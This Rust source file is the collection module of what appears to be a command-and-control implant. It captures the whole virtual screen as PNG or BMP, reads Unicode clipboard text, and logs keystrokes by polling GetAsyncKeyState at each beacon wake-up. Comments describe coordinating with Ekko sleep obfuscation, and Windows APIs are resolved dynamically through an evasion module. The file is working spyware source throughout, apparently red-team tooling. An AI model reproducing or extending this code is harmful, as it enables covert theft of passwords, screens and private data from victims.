//! Collection (ABR-T031): screenshot, clipboard and keystroke capture,
//! all in-process on the session thread.
//!
//! Screenshot: virtual-screen BitBlt into a top-down BGRA buffer, then
//! PNG through WIC (raw COM vtables resolved on demand); any WIC
//! failure falls back to a plain BMP (bigger, zero dependencies).
//!
//! Keylogger: NO dedicated thread. Ekko sleep obfuscation encrypts the
//! implant image while the session thread sleeps — a second thread
//! executing implant code would fault inside that window. Keystrokes
//! are sampled with GetAsyncKeyState at every beacon wake-up instead;
//! coverage equals the beacon cadence (documented limitation — a
//! syscalls-only stub thread is the follow-up).

// Same on-demand FFI transmute idiom as modules.rs (see the note there).
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;
use crate::message::collect_action;
use std::sync::Mutex;

fn user32(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("user32.dll", name) }
}
fn gdi32(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("gdi32.dll", name) }
}
fn ole32(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("ole32.dll", name) }
}
fn kernel32(name: &str) -> Option<usize> {
    unsafe { syscalls::export_address("kernel32.dll", name) }
}

/// Entry point of the COLLECT task.
pub fn stage(action: u8, _arg: &str) -> Result<Vec<u8>, String> {
    match action {
        collect_action::SCREENSHOT => screenshot(),
        collect_action::CLIPBOARD => clipboard_text(),
        collect_action::KEYLOG_DUMP => keylog_dump(),
        other => Err(format!("unknown collect action {other:#04x}")),
    }
}

// --- screenshot ---

struct Capture {
    width: usize,
    height: usize,
    bgra: Vec<u8>,
}

fn grab_screen() -> Result<Capture, String> {
    let metrics: unsafe extern "system" fn(i32) -> i32 = match user32("GetSystemMetrics") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GetSystemMetrics unresolved".into()),
    };
    let get_dc: unsafe extern "system" fn(usize) -> usize = match user32("GetDC") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GetDC unresolved".into()),
    };
    let release_dc: unsafe extern "system" fn(usize, usize) -> i32 = match user32("ReleaseDC") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("ReleaseDC unresolved".into()),
    };
    let create_dc: unsafe extern "system" fn(usize, usize, usize, usize) -> usize =
        match gdi32("CreateCompatibleDC") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("CreateCompatibleDC unresolved".into()),
        };
    let create_bmp: unsafe extern "system" fn(usize, i32, i32) -> usize =
        match gdi32("CreateCompatibleBitmap") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("CreateCompatibleBitmap unresolved".into()),
        };
    let select: unsafe extern "system" fn(usize, usize) -> usize = match gdi32("SelectObject") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("SelectObject unresolved".into()),
    };
    let delete: unsafe extern "system" fn(usize) -> i32 = match gdi32("DeleteObject") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("DeleteObject unresolved".into()),
    };
    let delete_dc: unsafe extern "system" fn(usize) -> i32 = match gdi32("DeleteDC") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("DeleteDC unresolved".into()),
    };
    let bit_blt: unsafe extern "system" fn(usize, i32, i32, i32, i32, usize, i32, i32, u32) -> i32 =
        match gdi32("BitBlt") {
            Some(addr) => unsafe { std::mem::transmute(addr) },
            None => return Err("BitBlt unresolved".into()),
        };
    let get_dibits: unsafe extern "system" fn(
        usize,
        usize,
        u32,
        u32,
        *mut u8,
        *mut u8,
        u32,
    ) -> i32 = match gdi32("GetDIBits") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GetDIBits unresolved".into()),
    };

    // Virtual screen: origin may be negative on multi-monitor setups.
    let (x, y) = unsafe { (metrics(76), metrics(77)) };
    let (w, h) = unsafe { (metrics(78), metrics(79)) };
    if w <= 0 || h <= 0 {
        return Err("empty virtual screen".into());
    }
    let (width, height) = (w as usize, h as usize);
    let screen = unsafe { get_dc(0) };
    if screen == 0 {
        return Err("GetDC failed (headless session?)".into());
    }
    let mem_dc = unsafe { create_dc(screen, 0, 0, 0) };
    let bitmap = unsafe { create_bmp(screen, w, h) };
    if mem_dc == 0 || bitmap == 0 {
        unsafe {
            if bitmap != 0 {
                delete(bitmap);
            }
            if mem_dc != 0 {
                delete_dc(mem_dc);
            }
            release_dc(0, screen);
        }
        return Err("GDI setup failed".into());
    }
    let old = unsafe { select(mem_dc, bitmap) };
    let copied = unsafe {
        bit_blt(mem_dc, 0, 0, w, h, screen, x, y, 0x00CC_0020) // SRCCOPY
    };
    let mut bgra = vec![0u8; width * height * 4];
    // BITMAPINFOHEADER: biSize, width, height (negative = top-down),
    // planes=1, bitcount=32, rest zero.
    let mut info = [0u8; 40];
    info[0..4].copy_from_slice(&40u32.to_le_bytes());
    info[4..8].copy_from_slice(&(w as u32).to_le_bytes());
    info[8..12].copy_from_slice(&(-h).to_le_bytes());
    info[12..14].copy_from_slice(&1u16.to_le_bytes());
    info[14..16].copy_from_slice(&32u16.to_le_bytes());
    let lines = if copied != 0 {
        unsafe {
            get_dibits(
                mem_dc,
                bitmap,
                0,
                h as u32,
                bgra.as_mut_ptr(),
                info.as_mut_ptr(),
                0, // DIB_RGB_COLORS
            )
        }
    } else {
        0
    };
    unsafe {
        select(mem_dc, old);
        delete(bitmap);
        delete_dc(mem_dc);
        release_dc(0, screen);
    }
    if lines == 0 {
        return Err("BitBlt/GetDIBits failed".into());
    }
    Ok(Capture {
        width,
        height,
        bgra,
    })
}

fn screenshot() -> Result<Vec<u8>, String> {
    let capture = grab_screen()?;
    match png_encode(&capture) {
        Some(png) => Ok(png),
        None => Ok(bmp_bytes(&capture)),
    }
}

fn bmp_bytes(capture: &Capture) -> Vec<u8> {
    let data = &capture.bgra;
    let size = 14 + 40 + data.len();
    let mut out = Vec::with_capacity(size);
    out.extend_from_slice(b"BM");
    out.extend_from_slice(&(size as u32).to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes());
    out.extend_from_slice(&54u32.to_le_bytes()); // bfOffBits
    out.extend_from_slice(&40u32.to_le_bytes());
    out.extend_from_slice(&(capture.width as u32).to_le_bytes());
    // Negative height again = top-down rows.
    out.extend_from_slice(&(-(capture.height as i32)).to_le_bytes());
    out.extend_from_slice(&1u16.to_le_bytes());
    out.extend_from_slice(&32u16.to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes()); // biCompression
    out.extend_from_slice(&(data.len() as u32).to_le_bytes()); // biSizeImage
    out.extend_from_slice(&0u32.to_le_bytes()); // biXPelsPerMeter
    out.extend_from_slice(&0u32.to_le_bytes()); // biYPelsPerMeter
    out.extend_from_slice(&0u32.to_le_bytes()); // biClrUsed
    out.extend_from_slice(&0u32.to_le_bytes()); // biClrImportant
    out.extend_from_slice(data);
    out
}

// --- PNG through WIC (raw COM) ---

/// GUIDs (mixed-endian DWORD/WORD layout).
const CLSID_WICIMAGING_FACTORY: [u8; 16] = [
    0xc5, 0xf5, 0x7c, 0xca, 0x7e, 0x1d, 0xf0, 0x4b, 0xab, 0x61, 0x29, 0x25, 0x6e, 0x9c, 0x41, 0xc8,
];
const IID_IWICIMAGING_FACTORY: [u8; 16] = [
    0xec, 0x5e, 0xc8, 0xac, 0xaa, 0x1a, 0x0d, 0x45, 0xb4, 0x2f, 0x74, 0xfc, 0x1a, 0xc3, 0x7a, 0x33,
];
const GUID_CONTAINER_FORMAT_PNG: [u8; 16] = [
    0x67, 0xa3, 0x62, 0x1f, 0x3c, 0x57, 0xc1, 0x47, 0xa8, 0xef, 0xed, 0xf1, 0x59, 0x85, 0xc5, 0x1a,
];
const GUID_WICPIXELFORMAT_32BPPBGRA: [u8; 16] = [
    0x7e, 0xe8, 0x84, 0x6f, 0x47, 0xda, 0x99, 0x4a, 0xa0, 0xc4, 0x8a, 0x08, 0x03, 0xaa, 0x8b, 0xa2,
];
const IID_ISTREAM: [u8; 16] = [
    0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

type VtblCall4 = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;

/// Calls `object`'s COM method at vtable `slot` (3 = first after
/// IUnknown) with up to 4 arguments (0-padded). HRESULT in i32.
#[allow(clippy::too_many_arguments)]
unsafe fn com(this: usize, slot: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    let vtbl = *(this as *const usize);
    let method: VtblCall4 = std::mem::transmute(*(vtbl as *const usize).add(slot));
    method(this, a1, a2, a3, a4)
}

fn hr_failed(hr: i32) -> bool {
    hr < 0
}

fn png_encode(capture: &Capture) -> Option<Vec<u8>> {
    unsafe {
        let co_init: unsafe extern "system" fn(*mut usize, u32) -> i32 =
            std::mem::transmute(ole32("CoInitializeEx")?);
        let co_create: unsafe extern "system" fn(*const u8, usize, *const u8, *mut usize) -> i32 =
            std::mem::transmute(ole32("CoCreateInstance")?);
        let co_uninit: unsafe extern "system" fn() = std::mem::transmute(ole32("CoUninitialize")?);

        let hr = co_init(std::ptr::null_mut(), 0x2); // COINIT_APARTMENTTHREADED
        let need_uninit = hr >= 0 || hr as u32 == 0x8001_0106; // RPC_E_CHANGED_MODE
        let result = (|| -> Option<Vec<u8>> {
            let mut factory = 0usize;
            let hr = co_create(
                CLSID_WICIMAGING_FACTORY.as_ptr(),
                1, // CLSCTX_INPROC_SERVER
                IID_IWICIMAGING_FACTORY.as_ptr(),
                &mut factory,
            );
            if hr_failed(hr) || factory == 0 {
                return None;
            }
            let release = |obj: usize| {
                let _: i32 = com(obj, 2 /* Release */, 0, 0, 0, 0);
            };
            // IWICImagingFactory::CreateStream = slot 14.
            let mut stream = 0usize;
            if hr_failed(com(
                factory,
                14,
                &mut stream as *mut usize as usize,
                0,
                0,
                0,
            )) {
                release(factory);
                return None;
            }
            // Buffer generous; the encoder writes far less than raw BGRA.
            let mut buffer = vec![0u8; capture.bgra.len() / 2 + 4096];
            // IWICStream::InitializeFromMemory = slot 5.
            let init_hr = com(stream, 5, buffer.as_mut_ptr() as usize, buffer.len(), 0, 0);
            if hr_failed(init_hr) {
                release(stream);
                release(factory);
                return None;
            }
            // CreateEncoder = slot 8.
            let mut encoder = 0usize;
            if hr_failed(com(
                factory,
                8,
                GUID_CONTAINER_FORMAT_PNG.as_ptr() as usize,
                &mut encoder as *mut usize as usize,
                0,
                0,
            )) {
                release(stream);
                release(factory);
                return None;
            }
            // IWICBitmapEncoder::Initialize(stream, WICBitmapEncoderNoCache) = slot 3.
            if hr_failed(com(encoder, 3, stream, 0, 0, 0)) {
                release(encoder);
                release(stream);
                release(factory);
                return None;
            }
            // CreateNewFrame(&frame, NULL) = slot 10.
            let mut frame = 0usize;
            if hr_failed(com(encoder, 10, &mut frame as *mut usize as usize, 0, 0, 0)) {
                release(encoder);
                release(stream);
                release(factory);
                return None;
            }
            let mut ok = !hr_failed(com(frame, 3, 0, 0, 0, 0)); // Initialize(NULL)
                                                                // SetSize = slot 5.
            ok = ok && !hr_failed(com(frame, 5, capture.width, capture.height, 0, 0));
            // SetPixelFormat(&guid) = slot 7 (in/out).
            let mut pixel_format = GUID_WICPIXELFORMAT_32BPPBGRA;
            ok = ok && !hr_failed(com(frame, 7, pixel_format.as_mut_ptr() as usize, 0, 0, 0));
            // WritePixels(lines, stride, size, data) = slot 13.
            let stride = capture.width * 4;
            ok = ok
                && !hr_failed(com(
                    frame,
                    13,
                    capture.height,
                    stride,
                    capture.bgra.len(),
                    capture.bgra.as_ptr() as usize,
                ));
            // Frame Commit = slot 15.
            ok = ok && !hr_failed(com(frame, 15, 0, 0, 0, 0));
            // Encoder Commit = slot 11.
            ok = ok && !hr_failed(com(encoder, 11, 0, 0, 0, 0));
            let mut out = None;
            if ok {
                // IStream::Stat(&statstg, STATFLAG_NONAME=1) = slot 12;
                // cbSize sits at offset 16 of the x64 STATSTG.
                let mut istream = 0usize;
                if com(
                    stream,
                    0, // QueryInterface
                    IID_ISTREAM.as_ptr() as usize,
                    &mut istream as *mut usize as usize,
                    0,
                    0,
                ) >= 0
                    && istream != 0
                {
                    let mut stat = [0u8; 96];
                    if com(istream, 12, stat.as_mut_ptr() as usize, 1, 0, 0) >= 0 {
                        let size = usize::from_le_bytes(stat[16..24].try_into().unwrap());
                        if size > 0 && size <= buffer.len() && buffer[0..8] == *b"\x89PNG\r\n\x1a\n"
                        {
                            out = Some(buffer[..size].to_vec());
                        }
                    }
                    release(istream);
                }
            }
            release(frame);
            release(encoder);
            release(stream);
            release(factory);
            out
        })();
        if need_uninit {
            co_uninit();
        }
        result
    }
}

// --- clipboard ---

fn clipboard_text() -> Result<Vec<u8>, String> {
    let open: unsafe extern "system" fn(usize) -> i32 = match user32("OpenClipboard") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("OpenClipboard unresolved".into()),
    };
    let close: unsafe extern "system" fn() -> i32 = match user32("CloseClipboard") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("CloseClipboard unresolved".into()),
    };
    let get_data: unsafe extern "system" fn(u32) -> usize = match user32("GetClipboardData") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GetClipboardData unresolved".into()),
    };
    let global_lock: unsafe extern "system" fn(usize) -> usize = match kernel32("GlobalLock") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GlobalLock unresolved".into()),
    };
    let global_unlock: unsafe extern "system" fn(usize) -> i32 = match kernel32("GlobalUnlock") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return Err("GlobalUnlock unresolved".into()),
    };
    if unsafe { open(0) } == 0 {
        return Err("OpenClipboard failed".into());
    }
    let mut out = String::new();
    // 13 = CF_UNICODETEXT.
    let handle = unsafe { get_data(13) };
    if handle != 0 {
        let ptr = unsafe { global_lock(handle) };
        if ptr != 0 {
            unsafe {
                let mut len = 0usize;
                let mut probe = ptr as *const u16;
                while *probe != 0 && len < 1 << 20 {
                    len += 1;
                    probe = probe.add(1);
                }
                out = String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len));
                global_unlock(handle);
            }
        }
    }
    unsafe { close() };
    if out.is_empty() {
        Ok(b"clipboard: <no text>\n".to_vec())
    } else {
        Ok(out.into_bytes())
    }
}

// --- keylogger (per-cycle sampling) ---

struct KeylogState {
    pressed: [bool; 256],
    buffer: String,
}

impl KeylogState {
    fn new() -> Self {
        KeylogState {
            pressed: [false; 256],
            buffer: String::new(),
        }
    }
}

fn keylog() -> &'static Mutex<KeylogState> {
    static STATE: std::sync::OnceLock<Mutex<KeylogState>> = std::sync::OnceLock::new();
    STATE.get_or_init(|| Mutex::new(KeylogState::new()))
}

/// Samples every virtual key once; called at each beacon wake-up.
pub fn sample_keys() -> bool {
    let Ok(mut state) = keylog().lock() else {
        return false;
    };
    let get_key: unsafe extern "system" fn(i32) -> i16 = match user32("GetAsyncKeyState") {
        Some(addr) => unsafe { std::mem::transmute(addr) },
        None => return false,
    };
    let mut appended = false;
    for vk in 8i32..256 {
        let state_bit = unsafe { get_key(vk) } as u16;
        let down = state_bit & 0x8000 != 0;
        let idx = vk as usize;
        if down && !state.pressed[idx] {
            if let Some(text) = key_name(vk) {
                state.buffer.push_str(&text);
                if state.buffer.len() > 32 * 1024 {
                    let drain = state.buffer.len() - 16 * 1024;
                    state.buffer.drain(..drain);
                }
                appended = true;
            }
        }
        state.pressed[idx] = down;
    }
    appended
}

fn key_name(vk: i32) -> Option<String> {
    Some(match vk {
        0x08 => "<bk>".into(),
        0x09 => "<tab>".into(),
        0x0D => "\n".into(),
        0x10 | 0xA0 | 0xA1 => "<shift>".into(),
        0x11 => "<ctrl>".into(),
        0x12 => "<alt>".into(),
        0x14 => "<caps>".into(),
        0x1B => "<esc>".into(),
        0x20 => " ".into(),
        0x21..=0x28 => format!(
            "<{}>",
            ["pgup", "pgdn", "end", "home", "left", "up", "right", "down"][(vk - 0x21) as usize]
        ),
        0x2E => "<del>".into(),
        0x30..=0x39 => char::from(b'0' + (vk - 0x30) as u8).to_string(),
        0x41..=0x5A => char::from(b'a' + (vk - 0x41) as u8).to_string(),
        0x70..=0x87 => format!("<f{}>", vk - 0x6F),
        _ => return None,
    })
}

fn keylog_dump() -> Result<Vec<u8>, String> {
    let mut state = keylog().lock().map_err(|_| "keylog state poisoned")?;
    let taken = std::mem::take(&mut state.buffer);
    state.pressed = [false; 256];
    if taken.is_empty() {
        Ok(b"keylog: <empty>\n".to_vec())
    } else {
        Ok(taken.into_bytes())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn screenshot_returns_png_or_bmp() {
        let image = screenshot().expect("screenshot");
        assert!(
            image.starts_with(b"\x89PNG\r\n\x1a\n") || image.starts_with(b"BM"),
            "neither PNG nor BMP: {} bytes starting {:?}",
            image.len(),
            &image[..8.min(image.len())]
        );
    }

    #[test]
    fn clipboard_returns_something() {
        let out = clipboard_text().expect("clipboard");
        assert!(!out.is_empty());
    }

    #[test]
    fn keylog_samples_and_dumps() {
        // No keys are (reliably) held during a test; the roundtrip of
        // the sampler + dump must still work and reset the buffer.
        let _ = sample_keys();
        let dump = keylog_dump().expect("keylog dump");
        assert!(!dump.is_empty());
        // Second dump is the reset state.
        let again = keylog_dump().expect("keylog dump 2");
        assert!(std::str::from_utf8(&again).unwrap().contains("empty"));
    }

    #[test]
    fn bmp_writer_shape() {
        let capture = Capture {
            width: 2,
            height: 1,
            bgra: vec![1, 2, 3, 255, 5, 6, 7, 255],
        };
        let bmp = bmp_bytes(&capture);
        assert!(bmp.starts_with(b"BM"));
        assert_eq!(bmp.len(), 54 + 8);
    }
}
